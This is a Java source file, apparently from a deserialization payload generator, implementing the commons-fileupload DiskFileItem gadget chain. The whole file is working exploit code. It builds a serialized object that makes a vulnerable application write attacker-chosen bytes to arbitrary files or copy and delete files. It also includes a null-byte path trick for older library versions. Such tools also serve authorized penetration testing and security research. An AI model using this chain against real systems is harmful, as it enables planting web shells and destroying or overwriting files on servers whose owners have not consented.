package com.ppp.chain.others;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.ppp.utils.maker.CryptoUtils;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.apache.commons.io.output.ThresholdingOutputStream;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-fileupload:commons-fileupload:1.3.1", "commons-io:commons-io:2.4"})
@Authors({Authors.MBECHLER})
@Sink({Sink.Default})
public class FileUpload implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(FileUpload.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        String command = sinksHelper.getCommand();

        Object kickOffObject = getChain(command);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        String[] parts = command.split(";");

        if (parts.length == 3 && "copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        } else if (parts.length == 3 && "write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        } else if (parts.length == 3 && "writeB64".equals(parts[0])) {
            return write(parts[1], CryptoUtils.base64decoder(parts[2]));
        } else if (parts.length == 3 && "writeOld".equals(parts[0])) {
            return writePre131(parts[1], parts[2].getBytes("US-ASCII"));
        } else if (parts.length == 3 && "writeOldB64".equals(parts[0])) {
            return writePre131(parts[1], CryptoUtils.base64decoder(parts[2]));
        } else {
            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
        }
    }

    public void release(DiskFileItem obj) throws Exception {
        // otherwise the finalizer deletes the file
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, null);
        Reflections.setFieldValue(obj, "dfos", dfos);
    }

    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws IOException, Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }


    // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
    private static DiskFileItem write(String dir, byte[] data) throws IOException, Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }


    // writes data to an arbitrary file
    private static DiskFileItem writePre131(String file, byte[] data) throws IOException, Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }
}

